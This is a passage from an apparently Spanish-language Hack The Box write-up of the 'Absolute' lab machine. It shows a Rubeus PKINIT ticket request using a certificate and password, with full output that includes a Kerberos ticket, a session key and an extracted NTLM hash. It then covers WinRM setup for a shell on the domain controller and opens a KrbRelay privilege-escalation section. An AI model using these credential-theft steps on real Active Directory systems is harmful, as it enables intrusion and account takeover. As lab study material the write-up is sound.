LRx0G2ncWE2spbm5vJEghHNUzC++oCVx+IUg7BYxeNNxJWGbzkKhaLr9zxUh+94ZaXPFdiwx00a1JoM00uvrMOk6Y5hXUgDCu/xD9Ghj6OufocQMPCdFfIuSCz6LNfy+1T+ESTr2pgDA7MB8wBwYFKw4DAhoEFP/2Wa26td4QNvYoAEsAKqQb8Aj5BBTMLXPc53du/ASCn05XC8bKMqJ3ugICB9A= /password:"nC38msY6DYWxnRBx" /domain:absolute.htb /dc:dc.absolute.htb /getcredentials /showPS /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=winrm_user
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\winrm_user'
[*] Using domain controller: 10.129.142.54:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  winrm_user
  UserRealm                :  ABSOLUTE.HTB
  EndTime                  :  08/11/2023 23:30:14
  RenewTill                :  08/11/2023 23:30:14
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  xlFGVb2NSEG/OGT554br/g==
  ASREP (key)              :  908B13B981F87CCB610AE52F5A8F6DE5

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : **8738C7413A5DA3BC1D083EFC0AB06CB2**
```

El comando se ha ejecutado correctamente y ya tenemos el ticket en memoria.

```
PS C:\Users\Alex\Desktop\HTB\Absolute> klist

El id. de inicio de sesión actual es 0:0xb74b2

Vales almacenados en caché: (1)

#0>     Cliente: winrm_user @ ABSOLUTE.HTB
        Servidor: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0xe10000 -> renewable initial pre_authent name_canonicalize
        Hora de inicio: 11/6/2023 20:33:13 (local)
        Hora de finalización:   11/6/2023 23:57:59 (local)
        Hora de renovación: 11/6/2023 23:57:59 (local)
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0x1 -> PRIMARY
        KDC llamado:
```

Pues como hemos visto anteriormente el usuario pertenece al grupo de `Remote Managament Users`, por lo que ya podríamos acceder por WinRM al DC. Puede ser que de problemas debido a la configuración de la máquina Windows de atacante.

```
PS C:\Users\Alex\desktop\HTB\Absolute> Enter-PSSession -ComputerName dc.absolute.htb
Enter-PSSession : Error de conexión al servidor remoto dc.absolute.htb. Mensaje de error: El cliente WinRM no puede
procesar la solicitud. Si el esquema de autenticación es distinto de Kerberos o si el equipo cliente no está unido a
lista TrustedHosts. Para obtener más información, ejecute el siguiente comando: winrm help config. Para obtener más
información, consulte el tema de la Ayuda about_Remote_Troubleshooting.
En línea: 1 Carácter: 1
+ Enter-PSSession -ComputerName dc.absolute.htb
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (dc.absolute.htb:String) [Enter-PSSession], PSRemotingTransportExceptio
   n
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
```

Para solucionarlo simplemente ejecutar el siguiente comando, para añadir a absolute como `Trusted Host`

```
PS C:\Users\Alex\desktop\HTB\Absolute> winrm set winrm/config/client '@{TrustedHosts="dc.absolute.htb"}'
Client
    NetworkDelayms = 5000
    URLPrefix = wsman
    AllowUnencrypted = false
    Auth
        Basic = true
        Digest = true
        Kerberos = true
        Negotiate = true
        Certificate = true
        CredSSP = false
    DefaultPorts
        HTTP = 5985
        HTTPS = 5986
    TrustedHosts = dc.absolute.htb
```

Y finalmente obtenemos una shell dentro del sistema.

![img](/assets/img/post/Absolute/20.png)

## Escalada de Privilegios

### KrbRelay

![[Pasted image 20231108200504.png]]

![[Pasted image 20231108202525.png]]